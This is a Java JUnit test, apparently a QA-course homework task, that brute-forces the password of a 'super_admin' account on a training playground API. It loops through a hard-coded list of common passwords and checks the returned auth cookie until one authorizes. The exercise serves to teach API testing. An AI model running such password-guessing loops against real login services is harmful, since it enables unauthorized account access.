import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class Task9Login {
    @Test
    public void testLogin(){
        String[] password = {"password","123456","123456789","12345678","12345","qwerty","abc123","password","football","1234567",
                "monkey","111111","letmein","1234","1234567890","dragon","baseball","sunshine","iloveyou","trustno1","princess",
                "adobe123[a]","123123","welcome","login","admin","solo","1q2w3e4r","master","666666","photoshop[a]","1qaz2wsx","qwertyuiop",
                "ashley","mustang","121212","starwars","654321","bailey","access","flower","555555","passw0rd","lovely","shadow","7777777",
                "michael","!@#$%^&*","jesus","password1","superman","hello","charlie","888888","696969","hottie","freedom","aa123456","qazwsx",
                "ninja","azerty","loveme","whatever","donald","batman","zaq1zaq1","Football","000000","qwerty123","123qwe"};

        System.out.println("Всего паролей "+password.length);
        Map<String, String> data = new HashMap<>();
        data.put("login", "super_admin");
        //в цикле перебираю пароли
        for(int i = 0; i < password.length;i++){
            data.put("password",password[i]);

            Response response = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            //сохраняю значение cookie, чтобы использовать в проверке
            String responseCookie = response.cookie("auth_cookie");

            Response checkCookie = RestAssured
                    .given()
                    .body(data)
                    .cookie("auth_cookie",responseCookie)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            //Нахожу верный пароль и прерываю цикл
           if(checkCookie.print().equals("You are authorized")) {
               System.out.println("successful password = "+password[i]);
               break;
           }



      }



    }
}
